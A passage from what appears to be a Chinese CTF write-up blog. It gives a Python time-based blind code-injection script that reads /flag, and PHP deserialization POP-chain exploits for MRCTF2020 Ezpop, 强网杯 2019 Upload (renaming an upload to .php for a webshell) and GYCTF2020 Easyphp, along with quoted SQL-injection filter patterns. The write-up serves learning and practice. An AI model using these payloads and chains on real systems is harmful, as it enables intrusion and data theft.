1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://f32915b5-e4b2-469f-b8b6-b16e707888b6.node3.buuoj.cn/calculate'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(bool_expr)</span>:</span></span><br><span class="line">    payload = <span class="string">"__import__('time').sleep(5) if %s else 1"</span> % bool_expr</span><br><span class="line">    t = time()</span><br><span class="line">    r = requests.post(url, json=&#123;<span class="string">'isVip'</span>: <span class="literal">True</span>, <span class="string">'expression'</span>: encode(payload)&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    delta = time() - t</span><br><span class="line">    print(payload, delta)</span><br><span class="line">    <span class="keyword">return</span> delta &gt; <span class="number">5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(geq_expression, l, r)</span>:</span>    <span class="comment">#二分法~</span></span><br><span class="line">    eq_expression = geq_expression.replace(<span class="string">'&gt;='</span>, <span class="string">'=='</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (r - l) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> mid <span class="keyword">in</span> range(l, r + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> query(eq_expression.format(num=mid)):</span><br><span class="line">                    <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'NOT FOUND'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> query(geq_expression.format(num=mid)):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"><span class="comment"># flag_len = binary_search("len(open('/flag').read())&gt;=&#123;num&#125;", 0, 100)</span></span><br><span class="line">flag_len = <span class="number">36</span></span><br><span class="line">print(<span class="string">'flag length: %d'</span> % flag_len)</span><br><span class="line">flag = <span class="string">'flag&#123;170f0d57-6cdd-405a-b1aa-9da5b742d6b1&#125;'</span></span><br><span class="line"><span class="keyword">while</span> len(flag) &lt; <span class="number">50</span>:</span><br><span class="line">    c = binary_search(<span class="string">"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;"</span> % len(flag), <span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> c:   <span class="comment"># the bs may fail due to network issues</span></span><br><span class="line">        flag += chr(c)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unserialize</title>
      <link href="/2020/05/30/unserialize/"/>
      <url>/2020/05/30/unserialize/</url>
      
        <content type="html"><![CDATA[<p>序列化<a id="more"></a>与php的魔术方法有关，做题前对魔术方法来个归纳</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line">__isset()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line">__unset()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>先贴源码，再好好分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单独来看看几个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发__invoke()魔术方法时，会调用append方法，包含$var,想办法包含flag.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化函数会触发__wakeup()魔术方法，这里__wakeup()能够触发__toString()魔术方法，让str为Test()类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把对象以函数的形式返回</p><p>pop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show--__wakeup--toString()--Test--__get()--Modifier--__invoke()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h3><p>这道题拖拖拉拉好几天了，今天来写一下吧</p><p>注册登录，有个上传文件，扫了一下，发现了<a href="http://www.tar.tz，下载扒下源码，有很多文件，看了freebuf上的wp，在application/web/controller/Register.php和application/web/controller/Index.php两个文件中存在着可利用点，下面就是来做代码审计了，就是因为水平不够，不是为了做题而做题，为了理清思路三天断断续续花了俩小时，还是很有收获的" target="_blank" rel="noopener">www.tar.tz，下载扒下源码，有很多文件，看了freebuf上的wp，在application/web/controller/Register.php和application/web/controller/Index.php两个文件中存在着可利用点，下面就是来做代码审计了，就是因为水平不够，不是为了做题而做题，为了理清思路三天断断续续花了俩小时，还是很有收获的</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>register.php中有一个析构函数，这里要让registed=0就能够调用index()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>profile中有两个魔术方法，调用不可访问对象时会触发__get，调用不可访问的方法时会触发__call魔术方法，这样通过上面的析构方法，让checker等于Profile类就能够触发__call魔术方法，然后进入函数会触发$this-&gt;index，调用不存在的对象    ，触发__get，返回$this-&gt;except[‘index’]，此时将except赋值为数组调用upload_img函数，就可以进行文件的复制、重命名</p><p>pop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Register-&gt;__destruct</span><br><span class="line">Profile-&gt; __call</span><br><span class="line">Profile-&gt; __get</span><br><span class="line">Profile-&gt; upload_img()</span><br></pre></td></tr></table></figure><p>附上自己的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.php"</span>;<span class="comment">//这里的路径来自源码中，自己找找能看到</span></span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/30/unserialize/1.png" class=""><p>成功改了文件名，蚁剑连接，根目录下找到flag</p><h3 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h3><img src="/2020/05/30/unserialize/2.png" class=""><p>登录界面，尝试了一下万能密钥，上不去</p><p>扫描一下目录结构，发现有<a href="http://www.zip,下载得到源码，分析" target="_blank" rel="noopener">www.zip,下载得到源码，分析</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要能够成功登录，就能拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br></pre></td></tr></table></figure><p>登录界面对常见的sql注入词都进行了过滤</p><p>重点部分在lib.php中，这里写了4个类，应该是序列化了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到dbCtrl类中，login函数中</p><ul><li>token的值为admin可以通过验证</li><li>password的MD5值等于数据库中的只也可登录成功</li></ul><p>这里的SQL查询语句应该是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">User</span> <span class="keyword">where</span> username=?<span class="string">"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span 